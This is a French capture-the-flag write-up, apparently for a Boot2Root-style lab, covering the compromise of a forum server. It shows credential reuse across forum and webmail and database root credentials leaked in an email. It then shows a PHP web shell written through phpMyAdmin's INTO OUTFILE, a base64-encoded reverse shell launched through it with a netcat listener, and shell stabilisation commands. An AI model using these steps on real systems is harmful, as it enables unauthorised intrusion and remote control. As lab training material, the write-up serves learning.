# Forum

## Rappel

Utilisateurs: 
- admin
- lmezard
- qudevide
- zaz
- wandre
- thor

Mot de passe: `!q\]Ej?*5K5cy*AJ`

En essayant ce mdp un peu partout (ssh puis forum) avec tous les users connus,
on trouve que ce mdp appartient à lmezard sur le forum.

## Suite

Depuis la page utilisateur de lmezard, on trouve son mail
`laurie@borntosec.net`

On tente alors de se connecter a son webmail via la route `/webmail`
avec le meme mot de passe et ça fonctionne !

on lit le mail `DB Access`, il contient le couple d'identifiants
`root:Fg-'kKXBj87E:aJ$` qui devrait correspondre aux identifiants de la DB, ou de phpmyadmin

on tente alors de se connecter a PHPMyadmin, succes
On explore alors un peu, on tente d'identifer les hash des mots de passe, sans succes
on passe lmezard en admin du forum, ça ne nous aide pas plus...

Apres beaucoup de temps a chercher et tenter des trucs, on a une idée:

Utiliser la query console phpmyadmin pour créer un reverse shell php et le lancer via "forum"
Le probleme etant qu'on ne sait pas ou on peux ecrire, ni ou ecrire pour lancer un script

On télécharge alors my little forum a la version correspondante,
trouvée sur la page "update" du mode admin (finalement ça aura servi), qui est `2.3.4`

Et on tente d'explorer l'arborescence du forum, en mirroir avec ce qu'on a téléchargé.
Le seul chemin qui nous permettait à priori de lancer du php est le chemin `/forum/templates_c/<fichier>.php`

On tente alors d'ecrire a cet endroit, d'abord avec un `phpinfo()` pour tester
En supposant que le forum est rangé dans `/var/www/forum`

```SQL
SELECT '<?php phpinfo() ?>' INTO OUTFILE "/var/www/forum/templates_c/info_file.php"
```
Et ça fonctionne ! Acceder a `https://<ip>/forum/templates_c/info_file.php` renvoie bien les infos sur PHP

On fait alors la meme avec un fichier qui va ecouter le query parameter `cmd`,
l'executer dans un shell et nous renvoyer le resultat:

```SQL
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE "/var/www/forum/templates_c/shell.php"
```
(trouvable dans `scripts/shell.php`)

On accede ensuite a `https://<ip>/forum/templates_c/shell.php?cmd=whoami` pour tester si ça fonctionne
on reçoit `www-data` ça fonctionne donc bien.

On sonde un peu pour avoir plus d'infos, notamment la présence ou non de python,
python est bien présent (`which python` retourne un resultat concluant)

On tente alors un script python de reverse shell connu (trouvable dans `scripts/shell.py.sh`),
mais par precaution pour eviter tout soucis avec des caracteres non gérés
on le passe en base64 puis on url encode la commande suivante

```bash
printf "<reverse shell en base64>" | base64 -d | sh
```
Ça décode code en base64 et puis ça le lance dans shell

De notre coté on lance netcat en mode écoute avec la commande suivante:
```bash
nc -nlvp <PORT>
```

On lance le script grace a notre fichier PHP et hop, ça fonctionne !

On stabilise le shell a l'aide du protocole suivant:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
puis CTRL-Z
```bash
stty raw -echo; fg
```
```
export TERM=xterm
```

On a maintenant un reverse shell propre sur le serveur.

## Sources

Oneliners de reverse shell: https://0xss0rz.github.io/2020-05-10-Oneliner-shells/
Stabiliser un reverse shell: https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
